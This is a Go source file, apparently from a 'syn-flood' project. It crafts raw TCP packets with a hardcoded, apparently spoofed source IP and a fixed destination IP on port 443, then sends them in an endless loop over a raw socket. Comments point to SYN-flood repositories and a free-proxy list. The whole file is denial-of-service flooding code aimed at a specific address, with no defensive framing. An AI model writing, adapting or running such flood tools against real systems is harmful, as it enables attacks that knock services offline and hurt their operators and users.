package main

import (
	"github.com/bilalcaliskan/syn-flood/pkg/raw"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"golang.org/x/net/ipv4"
	"log"
	"net"
)

func init() {

}

func main() {
	// https://www.programmersought.com/article/74831586115/
	// https://github.com/rootVIII/gosynflood
	// https://golangexample.com/repeatedly-send-crafted-tcp-syn-packets-with-raw-sockets/


	// https://pkg.go.dev/github.com/google/gopacket
	// https://github.com/david415/HoneyBadger/blob/021246788e58cedf88dee75ac5dbf7ae60e12514/packetSendTest.go
	// free proxies -> https://www.sslproxies.org/
	var srcIp, dstIp net.IP
	srcIpStr := "117.58.245.114"
	dstIpStr := "213.238.175.187"

	srcIp = net.ParseIP(srcIpStr).To4()
	dstIp = net.ParseIP(dstIpStr).To4()

	// build raw/ip packet
	packet := raw.CreatePacket(srcIp, dstIp)

	srcPort := layers.TCPPort(666)
	dstPort := layers.TCPPort(443)
	tcp := layers.TCP{
		SrcPort: srcPort,
		DstPort: dstPort,
		Window:  1505,
		Urgent:  0,
		Seq:     11050,
		Ack:     0,
		ACK:     false,
		SYN:     false,
		FIN:     false,
		RST:     false,
		URG:     false,
		ECE:     false,
		CWR:     false,
		NS:      false,
		PSH:     false,
	}

	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err := tcp.SetNetworkLayerForChecksum(&packet)
	if err != nil {
		panic(err)
	}

	packetHeaderBuf := gopacket.NewSerializeBuffer()
	err = packet.SerializeTo(packetHeaderBuf, opts)
	if err != nil {
		panic(err)
	}
	packetHeader, err := ipv4.ParseHeader(packetHeaderBuf.Bytes())
	if err != nil {
		panic(err)
	}

	tcpPayloadBuf := gopacket.NewSerializeBuffer()
	payload := gopacket.Payload("meowmeowmeowasdfasdfasdf")

	err = gopacket.SerializeLayers(tcpPayloadBuf, opts, &tcp, payload)
	if err != nil {
		panic(err)
	}
	// XXX end of packet creation

	// XXX send packet
	var packetConn net.PacketConn
	var rawConn *ipv4.RawConn
	packetConn, err = net.ListenPacket("ip4:tcp", "127.0.0.1")
	if err != nil {
		panic(err)
	}
	rawConn, err = ipv4.NewRawConn(packetConn)
	if err != nil {
		panic(err)
	}

	for {
		err = rawConn.WriteTo(packetHeader, tcpPayloadBuf.Bytes(), nil)
		log.Printf("packet of length %d sent!\n", len(tcpPayloadBuf.Bytes()) + len(packetHeaderBuf.Bytes()))
	}
}